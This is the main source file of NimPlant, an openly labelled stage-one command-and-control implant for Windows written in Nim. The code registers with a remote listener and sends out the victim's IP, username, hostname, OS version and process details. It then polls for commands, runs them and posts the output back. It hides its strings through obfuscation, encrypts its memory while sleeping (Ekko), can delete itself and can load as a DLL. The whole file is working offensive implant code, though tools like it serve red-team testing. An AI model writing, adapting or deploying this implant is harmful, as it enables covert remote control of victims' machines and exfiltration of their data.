#[

    NimPlant - A light stage-one payload written in Nim
    By Cas van Cooten (@chvancooten)

]#

from random import rand
from strutils import parseBool, parseInt, split
from math import `^`
import tables, times
import util/[functions, strenc, webClient, winUtils]

when defined sleepmask:
    import util/ekko
else:
    from os import sleep

when defined selfdelete:
    import util/selfDelete

var riskyMode = false
when defined risky:
    riskyMode = true

# Parse the configuration at compile-time
let CONFIG : Table[string, string] = parseConfig()

const version: string = "NimPlant v1.0"
proc runNp() : void =
    echo version

    # Get configuration information and create Listener object
    var listener = Listener(
        killDate: CONFIG[obf("killDate")],
        listenerHost: CONFIG[obf("hostname")],
        listenerIp: CONFIG[obf("listenerIp")],
        listenerPort: CONFIG[obf("listenerPort")],
        listenerType: CONFIG[obf("listenerType")],
        registerPath: CONFIG[obf("listenerRegPath")],
        resultPath: CONFIG[obf("listenerResPath")],
        sleepTime: parseInt(CONFIG[obf("sleepTime")]),
        sleepJitter: parseInt(CONFIG[obf("sleepJitter")]) / 100,
        taskPath: CONFIG[obf("listenerTaskPath")],
        userAgent: CONFIG[obf("userAgent")]
    )

    # Set the number of times NimPlant will try to register or connect before giving up
    let maxAttempts = 5
    var 
        currentAttempt = 0
        sleepMultiplier = 1 # For exponential backoff

    # Handle exponential backoff for failed registrations and check-ins
    proc handleFailedRegistration() : void =
        sleepMultiplier = 3^currentAttempt
        inc currentAttempt

        if currentAttempt > maxAttempts:
            when defined verbose:
                echo obf("DEBUG: Hit maximum retry count, giving up.")
            quit(0)

        when defined verbose:
            echo obf("DEBUG: Failed to register with server. Attempt: ") & $currentAttempt & obf("/") & $maxAttempts & obf(".")

    proc handleFailedCheckin() : void =
        sleepMultiplier = 3^currentAttempt
        inc currentAttempt

        if currentAttempt > maxAttempts:
            when defined verbose:
                echo obf("DEBUG: Hit maximum retry count, attempting re-registration.")
            currentAttempt = 0
            sleepMultiplier = 1
            listener.initialized = false
            listener.registered = false
        else:
            when defined verbose:
                echo obf("DEBUG: Server connection lost. Attempt: ") & $currentAttempt & obf("/") & $maxAttempts & obf(".")


    # Main loop
    while true:
        var
            cmdGuid : string
            cmd : string
            args : seq[string]
            output : string
            timeToSleep : int

        # Check if the kill timer expired, announce kill if registered
        # We add a day to make sure the specified date is still included
        if parse(listener.killDate, "yyyy-MM-dd") + initDuration(days = 1) < now():
            if listener.cryptKey != "":
                listener.killSelf()
            
            when defined verbose:
                echo obf("DEBUG: Kill timer expired. Goodbye cruel world!")
                
            quit(0)

        # Attempt to register with server if no successful registration has occurred
        if not listener.registered:
            try:
                if not listener.initialized:
                    # Initialize and check succesful initialization
                    listener.init()
                    if not listener.initialized:
                        when defined verbose:
                            echo obf("DEBUG: Failed to initialize listener.")
                        handleFailedRegistration()

                # Register and check succesful registration
                if listener.initialized:
                    listener.postRegisterRequest(getIntIp(), getUsername(), getHost(), getWindowsVersion(), getProcId(), getProcName(), riskyMode)
                    if not listener.registered:
                        when defined verbose:
                            echo obf("DEBUG: Failed to register with server.")
                        handleFailedRegistration()
            
                # Succesful registration, reset the sleep modifier if set and enter main loop
                if listener.registered:
                    when defined verbose:
                        echo obf("DEBUG: Successfully registered with server as ID: ") & $listener.id & obf(".")

                    currentAttempt = 0
                    sleepMultiplier = 1

            except:
                handleFailedRegistration()
        
        # Otherwise, process commands from registered server
        else: 
            # Check C2 server for an active command
            (cmdGuid, cmd, args) = listener.getQueuedCommand()
            
            # If a connection error occured, the server went down or restart - drop back into initial registration loop
            if cmd == obf("NIMPLANT_CONNECTION_ERROR"):
                cmd = ""
                handleFailedCheckin()
            else:
                currentAttempt = 0
                sleepMultiplier = 1

            # If a command was found, execute it
            if cmd != "":
                when defined verbose:
                    echo obf("DEBUG: Got command '") & $cmd & obf("' with args '") & $args & obf("'.")

                # Handle commands that directly impact the listener object here
                if cmd == obf("sleep"):
                    try: 
                        if len(args) == 2:
                            listener.sleepTime = parseInt(args[0])
                            var jit = parseInt(args[1])
                            listener.sleepJitter = if jit < 0: 0.0 elif jit > 100: 1.0 else: jit / 100
                        else:
                            listener.sleepTime = parseInt(args[0])
                            
                        output = obf("Sleep time changed to ") & $listener.sleepTime & obf(" seconds (") & $(toInt(listener.sleepJitter*100)) & obf("% jitter).")
                    except:
                        output = obf("Invalid sleep time.")
                elif cmd == obf("kill"):
                    quit(0)

                # Otherwise, parse commands via 'functions.nim'
                else:   
                    output = listener.parseCmd(cmd, cmdGuid, args)
                    
                if output != "":
                    listener.postCommandResults(cmdGuid, output)

        # Sleep the main thread for the configured sleep time and a random jitter %, including an exponential backoff multiplier
        timeToSleep = sleepMultiplier * toInt(listener.sleepTime.float - (listener.sleepTime.float * rand(-listener.sleepJitter..listener.sleepJitter)))

        when defined sleepmask:
            # Ekko Sleep obfuscation, encrypts the PE memory, set's permissions to RW and sleeps for the specified time
            when defined verbose:
                echo obf("DEBUG: Sleeping for ") & $timeToSleep & obf(" seconds using Ekko sleep mask.")
            ekkoObf(timeToSleep * 1000)
        else:
            when defined verbose:
                echo obf("DEBUG: Sleeping for ") & $timeToSleep & obf(" seconds.")
            sleep(timeToSleep * 1000)

when defined exportDll:
    from winim/lean import HINSTANCE, DWORD, LPVOID

    proc NimMain() {.cdecl, importc.}

    proc Update(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
        NimMain()
        runNp()
        return true

else:
    when isMainModule:
        when defined selfdelete:
            selfDelete.selfDelete()
        runNp()